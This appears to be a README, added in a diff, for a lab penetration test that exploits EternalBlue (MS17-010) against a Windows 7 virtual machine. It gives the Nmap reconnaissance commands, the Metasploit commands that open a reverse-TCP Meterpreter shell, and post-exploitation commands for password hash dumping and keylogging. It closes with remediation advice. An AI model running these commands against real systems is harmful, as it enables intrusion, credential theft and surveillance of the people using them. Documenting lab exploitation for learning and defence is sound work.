@@ -1,1 +1,133 @@
 
+
+````markdown
+# 🛡️ Windows 7 Penetration Testing: EternalBlue (MS17-010) Exploitation
+
+## 📌 Overview
+
+This project documents a penetration testing process against a Windows 7 virtual machine. The primary objective was to identify and exploit SMB-related vulnerabilities, specifically the **MS17-010 (EternalBlue)** vulnerability, using tools like **Nmap** and **Metasploit**.
+
+The test demonstrates how an unpatched Windows system can be compromised through network reconnaissance and exploitation, leading to full system access.
+
+---
+
+## 🧰 Tools Used
+
+| Tool         | Description                                      |
+|--------------|--------------------------------------------------|
+| Nmap         | Network scanner for port and service detection   |
+| NSE Scripts  | For SMB vulnerability detection                  |
+| Metasploit   | Framework used to exploit EternalBlue            |
+| Kali Linux   | Attacker system running the above tools          |
+| Windows 7 VM | Vulnerable target system                         |
+
+---
+
+## 🔍 Reconnaissance with Nmap
+
+### Command Used
+```bash
+nmap -sV 10.0.2.15
+````
+
+### Key Ports Detected
+
+* `135/tcp` — Microsoft RPC
+* `139/tcp` — NetBIOS Session Service
+* `445/tcp` — Microsoft SMB (vulnerable to EternalBlue)
+* `5357/tcp` — Microsoft HTTPAPI httpd
+* `49152-49159/tcp` — Dynamic RPC ports
+
+---
+
+## ⚠️ Vulnerability Detection
+
+### Initial Error
+
+```bash
+nmap --script smb-valn* 10.0.2.15
+```
+
+> ❌ Typo: `smb-valn*` does not match any script
+
+### Correct Command
+
+```bash
+nmap --script smb-vuln* 10.0.2.15
+```
+
+### Result
+
+* **smb-vuln-ms17-010: VULNERABLE**
+* Target is exploitable using EternalBlue.
+
+---
+
+## 💣 Exploitation with Metasploit
+
+### Commands
+
+```bash
+msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 10.0.2.15
+set LHOST <Your Kali IP>
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+exploit
+```
+
+### Result
+
+* Remote Meterpreter session opened
+* Full SYSTEM access gained
+
+---
+
+## 🧠 Post-Exploitation Actions
+
+Once inside:
+
+```bash
+sysinfo           # Target OS info
+getuid            # Current user privileges
+hashdump          # Extract local password hashes
+screenshot        # Take desktop screenshot
+keyscan_start     # Start keylogger
+keyscan_dump      # Dump keystrokes
+```
+
+---
+
+## 🛡️ Remediation Recommendations
+
+* Apply MS17-010 patch immediately
+* Disable SMBv1 protocol
+* Block ports 139 and 445 from untrusted networks
+* Regularly update and patch systems
+* Monitor network traffic for signs of SMB exploitation
+
+---
+
+## 📁 Project Structure
+
+```
+/windows7-penetration-test/
+│
+├── README.md
+├── VM_Window7_Report.docx       # Detailed technical report
+├── screenshots/                 # Screenshots of terminal & tools
+└── exploits/                    # Custom or logged exploitation scripts (optional)
+```
+
+
+---
+
+## ⚠️ Legal Disclaimer
+
+This project is for **educational purposes only**. Unauthorized access to computer systems is illegal. Always obtain proper authorization before performing penetration testing.
+
+
+```
+
+
+
